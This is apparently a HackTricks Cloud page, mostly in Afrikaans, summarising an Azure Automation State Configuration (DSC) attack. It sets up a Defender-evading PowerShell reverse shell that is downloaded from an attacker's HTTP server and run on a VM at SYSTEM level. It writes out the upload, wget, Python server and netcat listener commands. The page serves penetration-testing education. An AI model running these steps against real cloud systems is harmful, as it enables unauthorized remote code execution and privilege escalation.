# Az - State Configuration RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Check the complete post in:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Summary of Remote Server (C2) Infrastructure Preparation and Steps

#### Overview

Die proses behels die opstelling van 'n afstandsbediener-infrastruktuur om 'n gewysigde Nishang `Invoke-PowerShellTcp.ps1` payload, genaamd `RevPS.ps1`, te huisves, wat ontwerp is om Windows Defender te omseil. Die payload word bedien vanaf 'n Kali Linux masjien met IP `40.84.7.74` deur 'n eenvoudige Python HTTP-server. Die operasie word deur verskeie stappe uitgevoer:

#### Step 1 ‚Äî Create Files

* **Files Required:** Twee PowerShell-skripte is nodig:
1. `reverse_shell_config.ps1`: 'n Gewensde Toestand Konfigurasie (DSC) l√™er wat die payload aflaai en uitvoer. Dit is verkrygbaar van [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1).
2. `push_reverse_shell_config.ps1`: 'n skrip om die konfigurasie na die VM te publiseer, beskikbaar op [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).
* **Customization:** Veranderlikes en parameters in hierdie l√™ers moet aangepas word vir die gebruiker se spesifieke omgewing, insluitend hulpbronname, l√™erpaaie, en bediener/payload identifiseerders.

#### Step 2 ‚Äî Zip Configuration File

* Die `reverse_shell_config.ps1` word gecomprimeer in 'n `.zip` l√™er, wat dit gereed maak vir oordrag na die Azure Storage Account.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Stap 3 ‚Äî Stel Bergingskonteks in & Laai op

* Die gecomprimeerde konfigurasie-l√™er word na 'n vooraf gedefinieerde Azure Storage-container, azure-pentest, opgelaai met behulp van Azure se Set-AzStorageBlobContent cmdlet.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Stap 4 ‚Äî Berei Kali Box Voor

* Die Kali-bediener laai die RevPS.ps1 payload af van 'n GitHub-bewaarplek.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
* Die skrif is gewysig om die teiken Windows VM en poort vir die omgekeerde skulp te spesifiseer.

#### Stap 5 ‚Äî Publiseer Konfigurasie L√™er

* Die konfigurasie l√™er word uitgevoer, wat daartoe lei dat die omgekeerde-skulpskrif na die gespesifiseerde ligging op die Windows VM ontplooi word.

#### Stap 6 ‚Äî Gasheer Payload en Stel Luisteraar Op

* 'n Python SimpleHTTPServer word begin om die payload te gasheer, saam met 'n Netcat luisteraar om inkomende verbindings te vang.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
* Die geskeduleerde taak voer die payload uit, wat SYSTEM-vlak voorregte bereik.

#### Gevolgtrekking

Die suksesvolle uitvoering van hierdie proses open talle moontlikhede vir verdere aksies, soos kredensiaal dumping of die uitbreiding van die aanval na verskeie VM's. Die gids moedig voortgesette leer en kreatiwiteit in die gebied van Azure Automation DSC aan.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
